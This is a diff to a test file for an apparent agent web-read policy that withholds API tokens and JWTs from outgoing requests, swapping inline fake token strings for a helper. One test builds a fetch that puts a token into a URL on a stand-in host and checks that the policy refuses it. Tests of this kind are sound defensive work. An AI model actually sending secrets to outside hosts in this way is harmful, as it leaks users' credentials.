@@ -2,6 +2,7 @@ import { describe, it, expect, vi } from 'vitest';
 import { ApprovalPolicy, effectiveApprovalMode, type ApprovalModeSetting } from '../ApprovalPolicy';
 import { WebReadPolicy, type WebReadPolicyOptions } from '../webReadPolicy';
 import type { ApprovalRequest } from '../../interfaces/IApproval';
+import { fakeSecret } from './fakeSecret';
 
 const PUBLIC_IP = '93.184.215.14';
 
@@ -187,15 +188,14 @@ describe('WebReadPolicy egress guard', () => {
 
 describe('WebReadPolicy secret check', () => {
   it('withholds Google, GitLab, Stripe, Hugging Face and npm token shapes without an environment value', async () => {
-    // Assembled at runtime so GitHub push protection doesn't flag the source as holding live keys.
     const tokens = [
-      ['AIza', 'SyB7nQ2xR9mP4vK8tW6cH1zL5dF0gA3sE7uV'],
-      ['glpat-', 'B7nQ2xR9mP4vK8tW6cH1'],
-      ['sk_live_', 'B7nQ2xR9mP4vK8tW6cH1zL5dF'],
-      ['rk_live_', 'B7nQ2xR9mP4vK8tW6cH1zL5dF'],
-      ['hf_', 'B7nQ2xR9mP4vK8tW6cH1zL5dF0gA3sE'],
-      ['npm_', 'B7nQ2xR9mP4vK8tW6cH1zL5dF0gA3sE'],
-    ].map(([prefix, body]) => prefix + body);
+      fakeSecret('google'),
+      fakeSecret('gitlab'),
+      fakeSecret('stripeLive'),
+      fakeSecret('stripeRestricted'),
+      fakeSecret('huggingFace'),
+      fakeSecret('npm'),
+    ];
     for (const token of tokens) {
       const { reads, ask, decisions } = setup({ autonomous: true });
       const encoded = token.replace(/./g, (char) => `%${char.charCodeAt(0).toString(16)}`);
@@ -291,12 +291,12 @@ describe('WebReadPolicy secret check', () => {
   });
 
   it.each([
-    ['a GitHub token', 'ghp_' + 'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8'],
-    ['a fine-grained GitHub token', 'github_pat_' + '11ABCDEFG0123456789_abcdefghijklmnopqrstuvwxyz'],
-    ['an OpenAI-style key', 'sk-' + 'proj-Ab3dEf6hIj9kLm2nOp5qRs8t'],
-    ['an AWS access key id', 'AKIA' + 'IOSFODNN7EXAMPLE'],
-    ['a Slack token', 'xoxb-' + '123456789012-abcdefABCDEF'],
-    ['a JWT', 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U'],
+    ['a GitHub token', fakeSecret('github')],
+    ['a fine-grained GitHub token', fakeSecret('githubFineGrained')],
+    ['an OpenAI-style key', fakeSecret('openai')],
+    ['an AWS access key id', fakeSecret('aws')],
+    ['a Slack token', fakeSecret('slack')],
+    ['a JWT', fakeSecret('jwt')],
   ])('refuses %s in a URL', async (_label, token) => {
     const reason = await refused({ kind: 'fetch', url: `https://collect.example.com/?t=${encodeURIComponent(token)}` });
     expect(reason).not.toContain(token);
